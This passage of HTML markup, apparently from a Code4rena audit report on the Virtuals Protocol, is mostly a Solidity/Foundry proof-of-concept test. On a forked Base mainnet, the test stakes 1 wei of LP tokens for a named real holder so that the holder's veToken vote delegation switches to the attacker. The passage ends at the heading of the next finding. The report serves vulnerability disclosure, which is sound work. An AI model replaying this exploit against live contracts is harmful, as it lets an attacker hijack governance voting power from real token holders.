\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x1C4CcA7C5DB003824208aDDA61Bd749e55F463a3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xD418dfE7670c21F682E041F34250c114DB5D7789\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x0b3e328455c4059EEb9e3f84b5543F74E24e7E1b\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x4200000000000000000000000000000000000010\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIUniswapV2Router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIUniswapV2Router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBASE_RPC_URL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eenvString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;BASE_RPC_URL\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emakeAddr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;user\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetUp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforkId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateFork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBASE_RPC_URL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e29_225_700\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eselectFork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforkId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Set up the user with virtual tokens\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_malicious_stake_delegate_poc\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Swap half of the virtual tokens to agent tokens\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapExactTokensForTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Add liquidity to the pool to get LP tokens\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egameDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xD38493119859b8806ff28C32c41fdd67Ef41b8Ef\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Main holder of veTokens\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIVeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIVeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x974a21754271dD3d71a16F2852F8e226a9276b3E\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertNotEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edelegates\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egameDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Stake 1 wei of LP for gameDeployer to update delegate\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egameDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edelegates\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egameDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eVirtuals marked as informative\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"h-03-public-servicenftupdateimpact-call-leads-to-cascading-issue\" style=\"position:relative;\"\u003e\u003ca href=\"#h-03-public-servicenftupdateimpact-call-leads-to-cascading-issue\" aria-label=\"h 03 public servicenftupdateimpact call leads to cascading issue permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-9\"\u003e[H-03] Public \u003ccode\u003eServiceNft::updateImpact\u003c/code\u003e call leads to cascading issue\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-559\"\u003eYouCrossTheLineAlfie\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-350\"\u003eAstroboy\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-176\"\u003edebo\u003c/a\u003e, \u003ca 